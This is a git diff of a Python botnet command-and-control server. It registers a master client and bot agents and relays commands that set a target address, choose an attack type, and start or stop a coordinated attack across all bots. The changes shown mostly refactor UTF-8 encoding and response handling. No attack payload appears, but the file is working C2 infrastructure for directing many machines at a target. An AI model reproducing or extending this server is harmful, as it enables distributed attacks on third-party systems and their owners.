@@ -1,4 +1,5 @@
 from array import array
+from errno import ECANCELED
 import socket
 import sys
 from typing import Any
@@ -6,6 +7,7 @@ import select
 
 socket_list: list[socket.socket] = []
 RECV_BUFFER = 4096
+ENCODING = 'utf-8'
 
 bot_agents: dict[socket.socket, Any] = {}
 master_client: socket.socket = None
@@ -16,17 +18,18 @@ attacking: bool = False
 
 def accept_wrapper(sock: socket.socket) -> None:
     socket_list.append(sock)
-    sock.send(b"whoami:_")  # Ask client for identification
+    sock.send('whoami:_'.encode(ENCODING))  # Ask client for identification
 
 
 def request_router(sock: socket.socket) -> None:
     sock_addr = sock.getsockname()
     recv_data = sock.recv(RECV_BUFFER)
-    print(f'received request from ${sock_addr}')
+    recv_data_str = str(recv_data, ENCODING)
+    print(f'received request from ${recv_data_str}')
     try:
         if recv_data:
             try:
-                req_type, req_body = repr(recv_data).split(':')
+                req_type, req_body = recv_data_str.split(':')
                 if req_type == 'iam':   # iam request applies to both master and bot agent
                     iam_handler(sock, req_body)
                 elif sock in bot_agents:
@@ -35,12 +38,15 @@ def request_router(sock: socket.socket) -> None:
                     master_handler(sock, req_type, req_body)
                 else:
                     print(
-                        f'Cannot handle request from {sock_addr}\nrequest:{repr(recv_data)}'
+                        f'Cannot handle request from {sock_addr}\nrequest:{recv_data_str}'
                     )
-                    sock.send(bytes(f'{req_type}:error:cannot handle request'))
+                    response = f'{req_type}:error:cannot handle request'.encode(
+                        ENCODING)
+                    sock.send(response)
             except ValueError:
                 print(f'cannot parse request!')
-                sock.send(b'_:error:cannot parse request')
+                response = '_:error:cannot parse request'.encode(ENCODING)
+                sock.send(response)
         # No data received means that client closed gracefully
         else:
             disconnect_wrapper(sock)
@@ -53,12 +59,14 @@ def iam_handler(sock: socket.socket, body: str) -> None:
     if body == 'master':
         global master_client
         master_client = sock
-        sock.send(b'iam:success:master identified')
+        response = 'iam:success:master identified'
     elif body == 'bot':
         bot_agents[sock] = sock.getsockname()
-        sock.send(b'iam:success:bot identified')
+        response = 'iam:success:bot identified'
     else:
-        sock.send(b'iam:error:unknown type')
+        response = 'iam:error:unknown type'
+
+    sock.send(response.encode(ENCODING))
 
 
 def master_handler(sock: socket.socket, type: str, body: str) -> None:
@@ -67,40 +75,44 @@ def master_handler(sock: socket.socket, type: str, body: str) -> None:
     global target_address
     if type == 'listbot':
         if len(bot_agents) == 0:
-            sock.send(b'listbot: ')
-            return
-        list_bot = ''
-        for bot in bot_agents:
-            list_bot += repr(bot_agents[bot]) + ','
-        sock.send(bytes('listbot:' + list_bot))
+            response = 'listbot: '
+        else:
+            list_bot = ''
+            for bot in bot_agents:
+                list_bot += repr(bot_agents[bot]) + ','
+            response = ('listbot:' + list_bot)
     elif type == 'changeip':
         # TODO: check if valid ip/address
-        bot_broadcast(bytes(f'changeip:{body}'))
+        bot_broadcast(f'changeip:{body}'.encode(ENCODING))
         target_address = body
+        return
     elif type == 'changattk':
         # TODO: check if valid attack
-        bot_broadcast(bytes(f'changeattk:{body}'))
+        bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
         attk_type = body
+        return
     elif type == 'startattk':
         if not target_address:
-            sock.send(b'startattk:error:no target set')
+            response = 'startattk:error:no target set'
         elif not attk_type:
-            sock.send(b'startattk:error:no attack type set')
+            response = 'startattk:error:no attack type set'
         elif attacking:
-            sock.send(b'startattk:error:already attacking')
+            response = 'startattk:error:already attacking'
         else:
-            bot_broadcast(b'startattk:True')
+            bot_broadcast('startattk:True'.encode(ENCODING))
             attacking = True
-            sock.send('startattk:success:started attack')
+            response = 'startattk:success:started attack'
     elif type == 'stopattk':
         if not target_address or not attacking or not attk_type:
-            sock.send(b'stopattk:error:no attack in progress')
+            response = 'stopattk:error:no attack in progress'
         else:
-            bot_broadcast(b'stopattk:True')
+            bot_broadcast('stopattk:True'.encode(ENCODING))
             attacking = False
-            sock.send('stopattk:success:stopped attack')
+            response = 'stopattk:success:stopped attack'
     else:
-        sock.send(bytes(f'{type}:error:unknown command'))
+        response = f'{type}:error:unknown command'
+
+    sock.send(response.encode(ENCODING))
 
 
 def bot_handler(sock: socket.socket, type: str, body: str) -> None:
@@ -122,13 +134,15 @@ def disconnect_wrapper(sock: socket.socket) -> None:
         del bot_agents[sock]
 
         if master_client:
-            master_client.send(bytes(f'botleft:{sock_addr}'))
+            master_client.send(f'botleft:{sock_addr}'.encode(ENCODING))
 
         print(f'bot agent {sock_addr} disconnected')
     # master client disconnect
-    else:
+    elif master_client == sock:
         master_client = None
         print(f'master client {sock_addr} disconnected')
+    else:
+        print(f'client {sock_addr} disconnected')
 
 
 if __name__ == "__main__":
@@ -166,3 +180,4 @@ if __name__ == "__main__":
         print("caught keyboard interrupt, exiting")
     finally:
         server_socket.close()
+        sys.exit()
